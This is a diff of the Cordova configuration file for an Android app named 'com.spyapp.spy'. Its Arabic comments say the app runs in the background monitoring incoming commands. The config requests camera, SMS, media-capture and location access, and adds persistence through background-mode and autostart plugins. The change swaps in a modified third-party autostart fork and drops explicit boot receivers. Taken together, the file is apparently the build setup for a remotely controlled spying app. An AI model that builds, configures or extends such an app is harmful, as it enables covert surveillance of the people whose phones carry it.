@@ -1,3 +1,4 @@
+
 <?xml version='1.0' encoding='utf-8'?>
 <widget id="com.spyapp.spy" version="1.0.1"
     xmlns="http://www.w3.org/ns/widgets"
@@ -14,14 +15,14 @@
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
 
-    <!-- استهداف SDK حديث -->
+    <!-- استهداف Android 12+ -->
     <preference name="android-targetSdkVersion" value="34" />
 
-    <!-- إشعار الخلفية -->
+    <!-- إشعار خدمة الخلفية -->
     <preference name="BackgroundModeAndroidNotificationTitle" value="التطبيق يعمل في الخلفية" />
     <preference name="BackgroundModeAndroidNotificationText" value="جارٍ مراقبة الأوامر الواردة" />
 
-    <!-- الإضافات -->
+    <!-- الإضافات المطلوبة -->
     <plugin name="cordova-plugin-camera" />
     <plugin name="cordova-plugin-sms" />
     <plugin name="cordova-plugin-media-capture" />
@@ -34,12 +35,13 @@
     <plugin name="cordova-plugin-background-mode" />
     <plugin name="cordova-plugin-device" />
     <plugin name="cordova-plugin-network-information" />
-    <plugin name="cordova-plugin-autostart" />
+    <!-- استخدم النسخة المعدّلة من البلوجين مع exported=true -->
+    <plugin name="cordova-plugin-autostart" spec="https://github.com/elg3dawi/cordova-plugin-autostart-fixed.git" />
 
     <platform name="android">
-        <!-- أذونات عامة -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+                <!-- الأذونات -->
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
                 <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
                 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -59,40 +61,6 @@
                 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
             </manifest>
         </edit-config>
-
-        <!-- receivers مع android:exported (مطلوب لـ Android 12+) -->
-        <config-file file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
-            <application xmlns:android="http://schemas.android.com/apk/res/android">
-
-                <!-- BootCompletedReceiver -->
-                <receiver android:name="com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver"
-                          android:enabled="true"
-                          android:exported="true">
-                    <intent-filter>
-                        <action android:name="android.intent.action.BOOT_COMPLETED" />
-                        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-                    </intent-filter>
-                </receiver>
-
-                <!-- PackageReplacedReceiver -->
-                <receiver android:name="com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver"
-                          android:enabled="true"
-                          android:exported="true">
-                    <intent-filter>
-                        <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-                    </intent-filter>
-                </receiver>
-
-                <!-- UserPresentReceiver -->
-                <receiver android:name="com.tonikorin.cordova.plugin.autostart.UserPresentReceiver"
-                          android:enabled="true"
-                          android:exported="true">
-                    <intent-filter>
-                        <action android:name="android.intent.action.USER_PRESENT" />
-                    </intent-filter>
-                </receiver>
-
-            </application>
-        </config-file>
     </platform>
+
 </widget>
